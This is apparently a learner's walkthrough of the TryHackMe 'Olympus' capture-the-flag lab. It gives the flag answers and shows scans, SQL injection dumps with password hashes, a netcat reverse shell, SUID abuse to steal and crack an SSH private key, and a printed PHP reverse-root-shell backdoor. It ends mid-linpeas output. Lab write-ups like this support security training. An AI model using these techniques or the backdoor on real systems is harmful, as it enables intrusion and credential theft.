<h1 align="center">Olympus<br><img width="1200px" src="https://github.com/user-attachments/assets/2de07292-e13c-4919-b141-6d467fd656d0"></h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/760dba27-7082-4766-8c68-a3d36f9acbdb"><br>
June 18, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
part of my <code>408</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
My first CTF ! <br>Click <a href="https://tryhackme.com/room/olympusroom">here </a>to access the "room".</p>

<h2> Task 1 . Connection</h2>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>Start the VM</em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2>Task 2 . Flag submission</h2>

<h5 align="center"><img width="600px" src="https://github.com/user-attachments/assets/7368cf5e-ce9c-4f56-9e8d-b3c37da70405"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h5>

<h3 align="left"> Answer the questions below</h3>

> 2.1. <em>What is Flag 1?</em><br><a id='2.1'></a>
>> <strong><code>flag{Sm4rt!_k33P_d1gGIng}</code></strong><br>
<p></p>

<br>

> 2.2. <em>What is Flag 2??</em><br><a id='2.2'></a>
>> <strong><code>flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}</code></strong><br>
<p></p>

<br>

> 2.3. <em>What is Flag 3?</em><br><a id='2.3'></a>
>> <strong><code>flag{D4mN!_Y0u_G0T_m3_:)_}</code></strong><br>
<p></p>

<br>

> 2.4. <em>What is Flag 4?</em><br><a id='2.4'></a>
>> <strong><code>flag{Y0u_G0t_m3_g00d!}</code></strong><br>
<p></p>

<br>

<h3>nmap</h3>

```bash
:~# nmap -sS TargetIP
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

```bash
:~# nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT   STATE SERVICE VERSION
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
...
```

```bash
TargetIP olympus.thm
```

<h3>dirsearch</h3>

```bash
:~# dirsearch -u http://olympus.thm/ -i200,301,302,401 -w /usr/share/dirb/wordlists/common.txt
...
Target: http://olympus.thm/

Starting: 
301 -  315B  - /~webmaster  ->  http://olympus.thm/~webmaster/
301 -  315B  - /javascript  ->  http://olympus.thm/javascript/
301 -  311B  - /static  ->  http://olympus.thm/static/

Task Completed
```

```bash
:~# dirsearch -u http://olympus.thm/~webmaster/ -i200,301,302,401 -w /usr/share/dirb/wordlists/common.txt
...
Starting: ~webmaster/
301 -  321B  - /~webmaster/admin  ->  http://olympus.thm/~webmaster/admin/
301 -  319B  - /~webmaster/css  ->  http://olympus.thm/~webmaster/css/
301 -  321B  - /~webmaster/fonts  ->  http://olympus.thm/~webmaster/fonts/
301 -  319B  - /~webmaster/img  ->  http://olympus.thm/~webmaster/img/
301 -  324B  - /~webmaster/includes  ->  http://olympus.thm/~webmaster/includes/
301 -  318B  - /~webmaster/js  ->  http://olympus.thm/~webmaster/js/
200 -    1KB - /~webmaster/LICENSE

Task Completed
```

```bash
:~# dirsearch -u http://olympus.thm/~webmaster/admin/ -i200,301,302,401 -w /usr/share/dirb/wordlists/common.txt
...
Starting: ~webmaster/admin/
301 -  325B  - /~webmaster/admin/css  ->  http://olympus.thm/~webmaster/admin/css/
301 -  327B  - /~webmaster/admin/fonts  ->  http://olympus.thm/~webmaster/admin/fonts/
301 -  330B  - /~webmaster/admin/includes  ->  http://olympus.thm/~webmaster/admin/includes/
301 -  325B  - /~webmaster/admin/img  ->  http://olympus.thm/~webmaster/admin/img/
301 -  324B  - /~webmaster/admin/js  ->  http://olympus.thm/~webmaster/admin/js/

Task Completed
:~# 
```

<h3>http://olympus.thm</h3>
<p>- Olympus v2<br>
- under developpment<br>
- root@the-it-department</p>

![image](https://github.com/user-attachments/assets/6c601d90-db9c-45d3-b864-05949c980b7a)

<h3>http://olympus.thm/~webmaster/admin/ --> http://olympus.thm/~webmaster/index.php</h3>
<p>- Gods and Godess<br>
- 900 * 300<br>
- wordlist<br>
- Victor Alagwu
</p>

![image](https://github.com/user-attachments/assets/6f783828-a123-4b54-8c76-8b31f47449cc)

![image](https://github.com/user-attachments/assets/cd6ba025-f71a-448b-9e41-58a803329f94)

<h3>Burp Suite</h3>

![image](https://github.com/user-attachments/assets/7d40c041-4db0-4458-a81d-c053b3468fa6)

<p>saved <code>re</code></p>


<h3>sqlmap</h3>
<p>- <code>user_id</code> : <code>3</code><br>
- <code>user_name</code> : <code>prometheus</code><br>
- <code>user_firstname</code> : <code>prometheus</code><br>
- <code>user_lastname</code> : <code> </code><br>
- <code>user_email</code> : <code>prometheus@olympus.thm</code><br>
- <code>user_role</code> : <code>User</code><br>
- <code>user_password</code> : <code>$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C</code><br><br>

- <code>user_name</code> : <code>root</code><br> </p>



![image](https://github.com/user-attachments/assets/32ed3615-08a1-4411-812d-b2a6566c5e81)

![image](https://github.com/user-attachments/assets/ebb2f8d2-b029-47fd-bfc6-ed752c75e12f)



![image](https://github.com/user-attachments/assets/f57348da-a56f-4195-900f-25a99aba0fac)

![image](https://github.com/user-attachments/assets/97a146ee-ba3e-481b-8cf4-135e18b986f0)

![image](https://github.com/user-attachments/assets/9f1ae363-8e26-41d8-894a-bb9e9fbf02d2)

![image](https://github.com/user-attachments/assets/2b2bb716-494d-4cb7-a376-e8e08bba48e1)



```bash
Database: olympus
Table: flag
[1 entry]
+---------------------------+
| flag                      |
+---------------------------+
| flag{Sm4rt!_k33P_d1gGIng} |
+---------------------------+
```

```bash
Database: olympus
Table: posts
[3 entries]
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| post_id | post_category_id | post_date  | post_tags               | post_image      | post_title           | post_author | post_status | post_content                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | post_comment_count |
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
| 2       | 1                | 2022-04-22 | first, post             | img.jpg         | Dear Gods and Godess | root        | publish     | <div class="wp-container-7 entry-content wp-block-post-content" style="text-align: center;">\r\n<p><strong>This is the first version of the Olympus website. It should become a platform for each and everyone of you to express their needs and desires. Humans should not be allowed to visit it.</strong></p>\r\n<p><strong>You have all been sent a username and a password (that you will need to change ASAP) that will allow you to join the Olympus and create articles.</strong></p>\r\n<p><strong>I hope you will like this website,</strong></p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>\r\n</div>\r\n<p style="text-align: center;">\xa0</p[14:06:17] [WARNING] writing binary ('application/octet-stream') content to file '/root/.sqlmap/output/olympus.thm/dump/olympus/post_content-89916042.bin' 
| <blank>            |
| 3       | 1                | 2022-04-27 | credentials,security,it | 61X1U2-xUTL.jpg | Credentials          | root        | publish     | <p><strong>Dear Gods and Godess, I found out that some of you (not everyone thankfully) use really common passwords.</strong></p>\r\n<p><strong>As I remind you, we have a wordlist of forbidden password that you should use. </strong></p>\r\n<p><strong>Please update your passwords.</strong></p>\r\n<p>\xa0</p>\r\n<p><strong>Yours, root@the-it-guy</strong></p>                                                                                                                                                                                                                                                                                           [14:06:17] [WARNING] writing binary ('application/octet-stream') content to file '/root/.sqlmap/output/olympus.thm/dump/olympus/post_content-63352968.bin' 
| <blank>            |
| 6       | 1                | 2022-05-06 | update                  | <blank>         | Update is comming    | root        | publish     | <p style="text-align: center;"><strong>Dear gods and goddess,</strong><br /><strong>Once more, your IT god snapped his finger and here it goes :</strong><br /><strong>Olympus becomes something else, something bigger, something better.</strong><br /><strong>You will find every instruction, should you need them, here.</strong><br /><br /><strong>HOWEVER, DO NOT FORGET TO UPDATE YOUR E-MAIL ON YOUR ACCOUNT PROFILE.</strong><br /><br /><strong>root@the-it-department</strong> </p>                                                                                                                                                                   | <blank>            |
+---------+------------------+------------+-------------------------+-----------------+----------------------+-------------+-------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------+
```

```bash
Database: olympus
Table: categories
[5 entries]
+--------+------------+
| cat_id | cat_title  |
+--------+------------+
| 1      | News       |
| 2      | Technology |
| 3      | Tutorials  |
| 7      | Business   |
| 8      | Education  |
+--------+------------+

```

```bash
Database: olympus
Table: chats
[4 entries]
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+----------------------------------------+
| dt         | msg                                                                                                                                                             | uname      | file                                   |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+----------------------------------------+
| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | prometheus | 47c3210d51761686f3af40a875eeaaea.txt   |
| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | prometheus | <blank>                                |
| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | zeus       | <blank>                                |
| 2025-06-18 | Attached : rev.shell                                                                                                                                            | prometheus | 13d1c3cb82680fac35c2890d98e85190.shell |
+------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+------------+----------------------------------------+


```

```bash
Database: olympus
Table: users
[3 entries]
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
+---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
```

```bash

sqlmap -r request.txt --tamper-space2comment --level 2 --risk 2 -D olympus -T chats -C file --dump

...
Database: olympus                                                                                                                                                                                                                                                                                                 
Table: chats
[2 entries]
+----------------------------------------+
| file                                   |
+----------------------------------------+

| 47c3210d51761686f3af40a875eeaaea.txt   |
| c8aaf836eadd2ece8b50af8c41a2d432.php   |
+----------------------------------------+

```



![image](https://github.com/user-attachments/assets/838c35e9-8936-4220-b2f5-fd37b9a9b07a)

![image](https://github.com/user-attachments/assets/c62086e5-ad73-40cf-b227-b3e58e2090c3)



```bash
root@ip-10-10-34-122:~# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.31.236 52360
Linux ip-10-10-31-236 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 13:20:21 up 31 min,  0 users,  load average: 0.00, 0.00, 0.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),7777(web)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-10-31-236:/$ ^Z
[1]+  Stopped                 nc -nlvp 9001
root@ip-10-10-34-122:~# stty raw -echo; fg
nc -nlvp 9001

www-data@ip-10-10-31-236:/$ pwd
/
www-data@ip-10-10-31-236:/$ cd /var/www/html
www-data@ip-10-10-31-236:/var/www/html$ ls
0aB44fdS3eDnLkpsz3deGv8TttR4sc	index.html.old	index.php
www-data@ip-10-10-31-236:/var/www/html$ ls -lah
total 28K
drwxr-xr-x 3 www-data www-data 4.0K May  1  2022 .
drwxr-xr-x 5 root     root     4.0K Mar 22  2022 ..
drwxrwx--x 2 root     zeus     4.0K Jul 15  2022 0aB44fdS3eDnLkpsz3deGv8TttR4sc
-rwxr-xr-x 1 root     root      11K Apr 18  2022 index.html.old
-rwxr-xr-x 1 root     root       57 Apr 18  2022 index.php
www-data@ip-10-10-31-236:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/cputils
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/newgrp
/snap/snapd/23771/usr/lib/snapd/snap-confine
/snap/snapd/24505/usr/lib/snapd/snap-confine
/snap/core20/2571/usr/bin/chfn
/snap/core20/2571/usr/bin/chsh
/snap/core20/2571/usr/bin/gpasswd
/snap/core20/2571/usr/bin/mount
/snap/core20/2571/usr/bin/newgrp
/snap/core20/2571/usr/bin/passwd
/snap/core20/2571/usr/bin/su
/snap/core20/2571/usr/bin/sudo
/snap/core20/2571/usr/bin/umount
/snap/core20/2571/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2571/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
www-data@ip-10-10-31-236:/var/www/html$
...
www-data@ip-10-10-31-236:/var/www/html$ cd /home/zeus
www-data@ip-10-10-31-236:/home/zeus$ ls
snap  user.flag  zeus.txt
www-data@ip-10-10-31-236:/home/zeus$ cat user.flag
flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}
www-data@ip-10-10-31-236:/home/zeus$ cat zeus.txt
Hey zeus !


I managed to hack my way back into the olympus eventually.
Looks like the IT kid messed up again !
I've now got a permanent access as a super user to the olympus.



						- Prometheus.
www-data@ip-10-10-31-236:/home/zeus$
...
www-data@ip-10-10-31-236:/home/zeus$ 
www-data@ip-10-10-31-236:/home/zeus$ /usr/bin/cputils
  ____ ____        _   _ _     
 / ___|  _ \ _   _| |_(_) |___ 
| |   | |_) | | | | __| | / __|
| |___|  __/| |_| | |_| | \__ \
 \____|_|    \__,_|\__|_|_|___/
                               
Enter the Name of Source File: ./.ssh/id_rsa

Enter the Name of Target File: id_rsa

File copied successfully.
www-data@ip-10-10-31-236:/home/zeus$ ls
id_rsa	snap  user.flag  zeus.txt
www-data@ip-10-10-31-236:/home/zeus$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALr+COV2
NabdkfRp238WfMAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQChujddUX2i
WQ+J7n+PX6sXM/MA+foZIveqbr+v40RbqBY2XFa3OZ01EeTbkZ/g/Rqt0Sqlm1N38CUii2
eow4Kk0N2LTAHtOzNd7PnnvQdT3NdJDKz5bUgzXE7mCFJkZXOcdryHWyujkGQKi5SLdLsh
vNzjabxxq9P6HSI1RI4m3c16NE7yYaTQ9LX/KqtcdHcykoxYI3jnaAR1Mv07Kidk92eMMP
Rvz6xX8RJIC49h5cBS4JiZdeuj8xYJ+Mg2QygqaxMO2W4ghJuU6PTH73EfM4G0etKi1/tZ
R22SvM1hdg6H5JeoLNiTpVyOSRYSfZiBldPQ54/4vU51Ovc19B/bWGlH3jX84A9FJPuaY6
jqYiDMYH04dc1m3HsuMzwq3rnVczACoe2s8T7t/VAV4XUnWK0Y2hCjpSttvlg7NRKSSMoG
Xltaqs40Es6m1YNQXyq8ItLLykOY668E3X9Kyy2d83wKTuLThQUmTtKHVqQODSOSFTAukQ
ylADJejRkgu5EAAAWQVdmk3bX1uysR28RQaNlr0tyruSQmUJ+zLBiwtiuz0Yg6xHSBRQoS
vDp+Ls9ei4HbBLZqoemk/4tI7OGNPRu/rwpmTsitXd6lwMUT0nOWCXE28VMl5gS1bJv1kA
l/8LtpteqZTugNpTXawcnBM5nwV5L8+AefIigMVH5L6OebdBMoh8m8j78APEuTWsQ+Pj7s
z/pYM3ZBhBCJRWkV/f8di2+PMHHZ/QY7c3lvrUlMuQb20o8jhslmPh0MhpNtq+feMyGIip
mEWLf+urcfVHWZFObK55iFgBVI1LFxNy0jKCL8Y/KrFQIkLKIa8GwHyy4N1AXm0iuBgSXO
dMYVClADhuQkcdNhmDx9UByBaO6DC7M9pUXObqARR9Btfg0ZoqaodQ+CuxYKFC+YHOXwe1
y09NyACiGGrBA7QXrlr+gyvAFu15oeAAT1CKsmlx2xL1fXEMhxNcUYdtuiF5SUcu+XY01h
Elfd0rCq778+oN73YIQD9KPB7MWMI8+QfcfeELFRvAlmpxpwyFNrU1+Z5HSJ53nC0o7hEh
J1N7xqiiD6SADL6aNqWgjfylWy5n5XPT7d5go3OQPez7jRIkPnvjJms06Z1d5K8ls3uSYw
oanQQ5QlRDVxZIqmydHqnPKVUc+pauoWk1mlrOIZ7nc5SorS7u3EbJgWXiuVFn8fq04d/S
xBUJJzgOVbW6BkjLE7KJGkdssnxBmLalJqndhVs5sKGT0wo1X7EJRacMJeLOcn+7+qakWs
CmSwXSL8F0oXdDArEvao6SqRCpsoKE2Lby2bOlk/9gd1NTQ2lLrNj2daRcT3WHSrS6Rg0w
w1jBtawWADdV9248+Q5fqhayzs5CPrVpZVhp9r31HJ/QvQ9zL0SLPx416Q/S5lhJQQv/q0
XOwbmKWcDYkCvg3dilF4drvgNyXIow46+WxNcbj144SuQbwglBeqEKcSHH6EUu/YLbN4w/
RZhZlzyLb4P/F58724N30amY/FuDm3LGuENZrfZzsNBhs+pdteNSbuVO1QFPAVMg3kr/CK
ssljmhzL3CzONdhWNHk2fHoAZ4PGeJ3mxg1LPrspQuCsbh1mWCMf5XWQUK1w2mtnlVBpIw
vnycn7o6oMbbjHyrKetBCxu0sITu00muW5OJGZ5v82YiF++EpEXvzIC0n0km6ddS9rPgFx
r3FJjjsYhaGD/ILt4gO81r2Bqd/K1ujZ4xKopowyLk8DFlJ32i1VuOTGxO0qFZS9CAnTGR
UDwbU+K33zqT92UPaQnpAL5sPBjGFP4Pnvr5EqW29p3o7dJefHfZP01hqqqsQnQ+BHwKtM
Z2w65vAIxJJMeE+AbD8R+iLXOMcmGYHwfyd92ZfghXgwA5vAxkFI8Uho7dvUnogCP4hNM0
Tzd+lXBcl7yjqyXEhNKWhAPPNn8/5+0NFmnnkpi9qPl+aNx/j9qd4/WMfAKmEdSe05Hfac
Ws6ls5rw3d9SSlNRCxFZg0qIOM2YEDN/MSqfB1dsKX7tbhxZw2kTJqYdMuq1zzOYctpLQY
iydLLHmMwuvgYoiyGUAycMZJwdZhF7Xy+fMgKmJCRKZvvFSJOWoFA/MZcCoAD7tip9j05D
WE5Z5Y6je18kRs2cXy6jVNmo6ekykAssNttDPJfL7VLoTEccpMv6LrZxv4zzzOWmo+PgRH
iGRphbSh1bh0pz2vWs/K/f0gTkHvPgmU2K12XwgdVqMsMyD8d3HYDIxBPmK889VsIIO41a
rppQeOaDumZWt93dZdTdFAATUFYcEtFheNTrWniRCZ7XwwgFIERUmqvuxCM+0iv/hx/ZAo
obq72Vv1+3rNBeyjesIm6K7LhgDBA2EA9hRXeJgKDaGXaZ8qsJYbCl4O0zhShQnMXde875
eRZjPBIy1rjIUiWe6LS1ToEyqfY=
-----END OPENSSH PRIVATE KEY-----
www-data@ip-10-10-31-236:/home/zeus$ 
```


```bash
root@ip-10-10-34-122:~# nano id_rsa
```

```bash
root@ip-10-10-34-122:~# python3 /opt/john/ssh2john.py id_rsa > zeus_hash.txt
```

```bash
root@ip-10-10-34-122:~# john --wordlist=/usr/share/wordlists/rockyou.txt zeus_hash.txt
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
snowflake        (id_rsa)
```


```bash
root@ip-10-10-34-122:~# chmod 400 id_rsa
root@ip-10-10-34-122:~# ssh -i id_rsa zeus@olympus.thm
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed 18 Jun 2025 01:43:52 PM UTC

  System load:  0.03              Processes:             118
  Usage of /:   44.8% of 9.75GB   Users logged in:       1
  Memory usage: 76%               IPv4 address for eth0: 10.10.31.236
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Wed Jun 18 13:40:43 2025 from 10.10.34.122
zeus@ip-10-10-31-236:~$ find / -group zeus -print 2>/dev/null
...
home/zeus
/home/zeus/zeus.txt
/home/zeus/user.flag
/home/zeus/.sudo_as_admin_successful
/home/zeus/.bash_logout
/home/zeus/.ssh
/home/zeus/.ssh/authorized_keys
/home/zeus/.ssh/id_rsa
/home/zeus/.ssh/id_rsa.pub
/home/zeus/.ssh/known_hosts
/home/zeus/snap
/home/zeus/snap/lxd
/home/zeus/snap/lxd/22753
/home/zeus/snap/lxd/current
/home/zeus/snap/lxd/32662
/home/zeus/snap/lxd/common
/home/zeus/snap/lxd/common/config
/home/zeus/snap/lxd/common/config/config.yml
/home/zeus/.gnupg
/home/zeus/.gnupg/pubring.kbx
/home/zeus/.gnupg/private-keys-v1.d
/home/zeus/.gnupg/trustdb.gpg
/home/zeus/.local
/home/zeus/.local/share
/home/zeus/.local/share/nano
/home/zeus/.bashrc
/home/zeus/a
/home/zeus/.profile
/home/zeus/.cache
/home/zeus/.cache/motd.legal-displayed
/usr/bin/cputils
/run/user/1000
/run/user/1000/snapd-session-agent.socket
/run/user/1000/pk-debconf-socket
/run/user/1000/gnupg
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent.browser
/run/user/1000/gnupg/S.dirmngr
/run/user/1000/bus
/run/user/1000/systemd
/run/user/1000/systemd/private
/run/user/1000/systemd/notify
/run/user/1000/systemd/units
/run/user/1000/systemd/units/invocation:dbus.socket
/run/user/1000/inaccessible
/var/www/olympus.thm/public_html/~webmaster/search.php
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/index.html
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
/proc/1534
/proc/1534/task
/proc/1534/task/1534
/proc/1534/task/1534/fd
/proc/1534/task/1534/fd/0
/proc/1534/task/1534/fd/1
/proc/1534/task/1534/fd/2

...
zeus@ip-10-10-31-236:/var/www/html$ ls
0aB44fdS3eDnLkpsz3deGv8TttR4sc  index.html.old  index.php
zeus@ip-10-10-31-236:/var/www/html$ cd 0aB44fdS3eDnLkpsz3deGv8TttR4sc
zeus@ip-10-10-31-236:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls
index.html  VIGQFQFMYOST.php
zeus@ip-10-10-31-236:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ cat VIGQFQFMYOST.php

olymous.thm/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
zeus@ip-10-10-31-236:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ ls -lah
total 12K
drwxrwx--x 2 root     zeus     4.0K Jul 15  2022 .
drwxr-xr-x 3 www-data www-data 4.0K May  1  2022 ..
-rwxr-xr-x 1 root     zeus        0 Apr 14  2022 index.html
-rwxr-xr-x 1 root     zeus     1.6K Jul 15  2022 VIGQFQFMYOST.php
...
zeus@ip-10-10-31-236:~$ ls -lah
total 160K
drwxr-xr-x 7 zeus zeus     4.0K Jun 18 13:51 .
drwxr-xr-x 4 root root     4.0K Jun 18 12:49 ..
-rw-rw-r-- 1 zeus zeus      49K Jun 18 13:49 a
lrwxrwxrwx 1 root root        9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r-- 1 zeus zeus      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 zeus zeus     3.7K Feb 25  2020 .bashrc
drwx------ 2 zeus zeus     4.0K Mar 22  2022 .cache
drwx------ 3 zeus zeus     4.0K Apr 14  2022 .gnupg
-r-------- 1 zeus www-data 2.6K Jun 18 13:26 id_rsa
-rw------- 1 zeus zeus       28 Jun 18 13:51 .lesshst
drwxrwxr-x 3 zeus zeus     4.0K Mar 23  2022 .local
-rw-r--r-- 1 zeus zeus      807 Feb 25  2020 .profile
drwx------ 3 zeus zeus     4.0K Apr 14  2022 snap
drwx------ 2 zeus zeus     4.0K Jun 18 13:41 .ssh
-rw-r--r-- 1 zeus zeus        0 Mar 22  2022 .sudo_as_admin_successful
-rw-rw-r-- 1 zeus zeus       34 Mar 23  2022 user.flag
-rw-r--r-- 1 zeus zeus      49K Jun 18 13:51 z3deGv8TttR4sc
-r--r--r-- 1 zeus zeus      199 Apr 15  2022 zeus.txt
zeus@ip-10-10-31-236:~$
```

![image](https://github.com/user-attachments/assets/0c1b1ae7-b4f2-4017-80d1-603470190be1)



```bash
zeus@ip-10-10-31-236:/tmp$ ./linpeas.sh
...





 [ - ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ - ]  console-setup.sh
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ - ]  grub-common
 [ - ]  hwclock.sh
 [ - ]  irqbalance
 [ - ]  iscsid
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ - ]  lvm2
